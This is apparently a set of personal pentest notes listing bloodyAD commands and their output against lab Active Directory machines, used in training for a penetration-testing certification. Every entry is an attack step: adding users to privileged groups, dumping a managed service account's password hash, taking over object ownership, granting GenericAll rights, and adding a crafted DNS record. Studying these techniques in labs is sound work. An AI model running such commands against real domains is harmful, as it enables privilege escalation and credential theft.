# BloodyAD

% bloodyad, ldap, ad, cpts

## BloodyAD - BloodyAD - BloodyAD - BloodyAD - BloodyAD - fluffy
#cat/ATTACK #cpts
extrait du PDF Joplin: fluffy

```
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.10.11.69 add groupMember 'service accounts' p.agila [ + ] p.agila added to service accounts
```

## BloodyAD - BloodyAD - BloodyAD - BloodyAD - BloodyAD - tombwatcher
#cat/ATTACK #cpts
extrait du PDF Joplin: tombwatcher

```
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'alfred' -p 'basketball' add groupMember 'INFRASTRUCTURE' 'alfred' [ + ] alfred added to INFRASTRUCTURE
```

## BloodyAD - BloodyAD - BloodyAD - BloodyAD - BloodyAD - tombwatcher-2
#cat/ATTACK #cpts
extrait du PDF Joplin: tombwatcher

```
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'alfred' -p 'basketball' get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword distinguishedName: CN = ansible_dev ,CN = Managed Service Accounts ,DC = tombwatcher ,DC = htb msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:838b2bd83fbe39901be3713e8c79ce37 msDS-ManagedPassword.B64ENCODED: 8VCLe0Us2p7wtGUBb + I/kfK9bX7Mh1GNZL1kZS07PnWp0wKjEnUIQBqKJo77kBj0k + et1VSarcaHz9 bBv/dl9cHW4jo/eMlHGOtDHAF + 8PTsLLEi2/6w2Avokuuaxl0S3ughelQJa/AHT2sCHwkG5 + ILd3xn 9S54vTFRBKC8193W/gIX/tDXJinmvqlp5d2ZW0k3iPdZ3hK4msGyY7f7ghNuUbUkvakd/Dj
```

## BloodyAD - BloodyAD - BloodyAD - BloodyAD - BloodyAD - tombwatcher-3
#cat/ATTACK #cpts
extrait du PDF Joplin: tombwatcher

```
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'sam' -p 'rogue' set owner john sam [ + ] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```

## BloodyAD - BloodyAD - BloodyAD - BloodyAD - BloodyAD - tombwatcher-4
#cat/ATTACK #cpts
extrait du PDF Joplin: tombwatcher

```
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'sam' -p 'rogue' add genericAll john sam [ + ] sam has now GenericAll on john
```

## BloodyAD - BloodyAD - BloodyAD - BloodyAD - BloodyAD - vulncicada
#cat/ATTACK #cpts
extrait du PDF Joplin: vulncicada

```
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.65 [ + ] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

## BloodyAD - BloodyAD - BloodyAD - BloodyAD - BloodyAD - redelegate
#cat/ATTACK #cpts
extrait du PDF Joplin: redelegate

```
bloodyAD -d redelegate.vl -k --host "dc.redelegate.vl" add uac FS01
```

## BloodyAD - BloodyAD - BloodyAD - BloodyAD - BloodyAD - redelegate-2
#cat/ATTACK #cpts
extrait du PDF Joplin: redelegate

```
bloodyAD -d redelegate.vl -k --host "dc.redelegate.vl" set object FS01
```

